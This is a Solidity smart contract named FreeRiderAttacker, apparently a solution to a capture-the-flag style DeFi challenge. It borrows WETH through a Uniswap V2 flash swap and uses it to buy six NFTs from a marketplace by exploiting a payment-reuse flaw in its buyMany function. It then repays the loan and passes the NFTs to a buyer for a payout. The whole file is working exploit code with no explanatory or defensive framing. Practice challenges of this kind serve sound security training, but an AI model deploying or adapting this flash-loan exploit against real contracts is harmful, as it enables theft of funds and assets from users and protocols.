// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderAttacker is Ownable, IUniswapV2Callee, IERC721Receiver {
    address private immutable buyer;
    IFreeRiderNFTMarketplace private immutable marketplace;
    IERC721 private immutable nft;
    IUniswapV2Pair private immutable uniswapPair;
    IUniswapV2Factory private immutable uniswapFactory;
    IWETH private immutable weth;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _buyer,
        address _marketplace,
        address _nft,
        address _uniswapPair,
        address _uniswapFactory,
        address _weth
    ) {
        buyer = _buyer;
        marketplace = IFreeRiderNFTMarketplace(_marketplace);
        nft = IERC721(_nft);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        uniswapFactory = IUniswapV2Factory(_uniswapFactory);
        weth = IWETH(_weth);
    }

    function attack(uint256 amount) external onlyOwner {
        // Execute a flash swap to gain more WETH and attack marketplace
        uniswapPair.swap(amount, 0, address(this), "1");

        // Give NFTs to buyer and receive payout
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), buyer, tokenIds[i]);
        }
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == uniswapFactory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        assert(sender == address(this)); // ensure that sender is this contract

        // Unwrap WETH to ETH
        weth.withdraw(amount0);

        // Use ETH to attack marketplace vulnerability
        marketplace.buyMany{value: amount0}(tokenIds);

        // Return amount + fee (amountRequired >= amountWithdrawn / .997)
        uint256 amountRequired = amount0 + 0.0452 ether;

        // Wrap ETH to WETH
        weth.deposit{value: amountRequired}();

        // Return the amount required to close flash swap
        assert(weth.transfer(msg.sender, amountRequired));
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
